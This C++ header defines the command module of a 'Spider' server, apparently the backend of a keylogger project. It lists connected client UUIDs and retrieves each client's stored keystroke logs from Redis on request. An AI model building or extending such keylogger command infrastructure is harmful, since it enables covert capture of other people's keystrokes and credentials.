//
// Created by hippolyteb on 11/14/16.
//

#ifndef SPIDER_SERVER_COMMANDERMODULE_HPP
#define SPIDER_SERVER_COMMANDERMODULE_HPP

#include "../Interfaces/ISpiderBusinessModule.hpp"
#include "../ProtoEnvelopes/Proto/RequestPacket.pb.h"
#include "../SpiderEventManager/SpiderEventEmitter.hpp"
#include "../SpiderEventManager/SpiderEventListener.hpp"
#include "../ProtoEnvelopes/Proto/SpiderCommands.pb.h"
#include "../Interfaces/Database/ISpiderKeyValueDatabaseDriver.hpp"
#include "../SpiderDatabaseDriver/RedisDriver/RedisDriver.hpp"
#include "../ProtoEnvelopes/Proto/ListUUIDSCommandResponse.pb.h"
#include "../ProtoEnvelopes/Proto/GetKeylogCommandResponse.pb.h"
#include "../Serialization/SpiderSerializer.hpp"
#include "../ProtoEnvelopes/Proto/SpiderKeyloggingPayload.pb.h"
#include "../SpiderDatabaseDriver/SpiderTypedRepositoryDriver.hpp"

class CommanderModule : public ISpiderBusinessModule {
    std::unique_ptr<ISpiderEventListener<ClientList>> _commandListClientListener = std::unique_ptr<ISpiderEventListener<ClientList>>(new SpiderEventListener<ClientList>());
    std::unique_ptr<ISpiderEventListener<GetClientLog>> _commandGetLogListener = std::unique_ptr<ISpiderEventListener<GetClientLog>>(new SpiderEventListener<GetClientLog>());
    std::unique_ptr<ISpiderEventEmitter> _eventEmitter = std::unique_ptr<ISpiderEventEmitter>(new SpiderEventEmitter());

    std::unique_ptr<ISpiderKeyValueDatabaseDriver> _uuidRepository = std::unique_ptr<ISpiderKeyValueDatabaseDriver>(new RedisDriver<Sets>());;
    std::unique_ptr<SpiderTypedRepositoryDriver<SpiderKeyLoggingPayload>> _keylogRepository = std::unique_ptr<SpiderTypedRepositoryDriver<SpiderKeyLoggingPayload>>(new SpiderTypedRepositoryDriver<SpiderKeyLoggingPayload>(new RedisDriver<List>()));;

private:

public:
    CommanderModule() {
        _commandListClientListener->Register("ClientList", [&](std::string clientId, ClientList &payload) {
            auto vec = _uuidRepository->GetSecondaryKeyElements("uuids", 0, 1000);
            ListUUIDSCommandResponse res;
            for(auto const& value: vec)
                res.add_uuid(value);

            _eventEmitter->Emit("Commander:SpiderNetworkManager", SpiderSerializer::CreateResponseFromPayload(clientId, res));
        });
        _commandGetLogListener->Register("GetClientLog", [&](std::string clientId, GetClientLog &payload) {
            auto vec = _keylogRepository->GetSecondaryKeyElements("keylog" + clientId, 0, payload.limit());
            GetKeylogCommandResponse res;
            for(auto const& value: vec)
                res.add_keylog()->CopyFrom(value);

            _eventEmitter->Emit("Commander:SpiderNetworkManager", SpiderSerializer::CreateResponseFromPayload(clientId, res));
        });
    }
};

#endif //SPIDER_SERVER_COMMANDERMODULE_HPP
